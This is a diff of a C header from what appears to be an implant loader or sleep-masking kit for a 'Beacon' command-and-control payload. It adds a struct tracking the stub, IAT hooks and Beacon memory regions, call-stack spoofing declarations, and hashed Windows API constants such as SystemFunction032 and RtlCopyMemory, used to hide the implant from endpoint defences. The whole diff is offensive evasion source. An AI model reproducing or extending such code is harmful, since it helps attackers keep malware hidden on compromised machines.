@@ -43,12 +43,13 @@
 
 typedef struct __attribute__(( packed ))
 {
-    ULONG_PTR Region;
-    ULONG_PTR Size;
-    HANDLE    Heap;
-    ULONG_PTR ExecRegionSize;
-    ULONG_PTR OriginalText;
-    ULONG_PTR OriginalPayload;
+    ULONG_PTR Region;           // Base address of Stub + IAT Hooks/Utils + Beacon
+    ULONG_PTR Size;             // Size of Stub + IAT Hooks/Utils + Beacon
+    HANDLE    Heap;             // Heap Handle
+    ULONG_PTR ExecRegion;       // Base address of the original Stub + IAT Hooks/Utils + Beacon
+    ULONG_PTR ExecRegionSize;   // Size of Stub + IAT Hooks/Utils + Beacon .text
+    ULONG_PTR OriginalText;     // Base address of the original backed up .text
+    ULONG_PTR OriginalTextSize; // Size of Original .text section
 } STUB, *PSTUB ;
 
 typedef struct
@@ -121,6 +122,10 @@ extern ULONG_PTR GetIp( VOID );
 extern ULONG_PTR Stub( VOID );
 extern PVOID     Spoof( PVOID, PVOID, PVOID, PVOID, PPRM, PVOID, QWORD, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID );
 extern PVOID     Fixup( VOID );
+extern PVOID     GetRet( VOID );
+// These don't matter
+extern PVOID     nRtlZeroMemory( VOID );
+extern PVOID     nRtlCopyMemory( VOID );
 
 
 #include "util.h"
@@ -171,7 +176,8 @@ extern PVOID     Fixup( VOID );
 #define H_API_RTLUSERTHREADSTART                    0x353797c
 #define H_API_RTLRANDOMEX                           0x7f1224f5
 #define H_API_RTLWALKHEAP                           0x182bae64
-#define H_API_SLEEP                                 0xe07cd7e
+#define H_API_RTLCOPYMEMORY                         0xd232bb4b
+#define H_API_RTLZEROMEMORY                         0x7906a570
 
 // advapi32.dll
 #define H_API_SYSTEMFUNCTION032                     0xe58c8805
@@ -182,6 +188,7 @@ extern PVOID     Fixup( VOID );
 #define H_API_SLEEP                                 0xe07cd7e
 #define H_API_WAITFORSINGLEOBJECTEX                 0x512e1b97
 #define H_API_BASETHREADINITTHUNK                   0xe2491896
+#define H_API_SLEEP                                 0xe07cd7e
 
 // kernelbase.dll
 #define H_API_SETPROCESSVALIDCALLTARGETS            0x647d9236
